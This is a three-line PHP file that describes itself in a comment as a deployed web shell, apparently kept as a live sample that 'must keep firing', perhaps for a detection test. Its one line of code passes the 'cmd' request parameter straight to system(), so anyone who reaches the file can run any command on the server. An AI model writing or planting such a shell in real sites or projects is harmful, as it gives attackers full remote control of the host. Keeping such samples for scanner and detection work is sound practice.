<?php
// Single deployed webshell file: request input handed to a shell sink in
// executable code. This is not a corpus file and must keep firing.
system($_GET['cmd']);
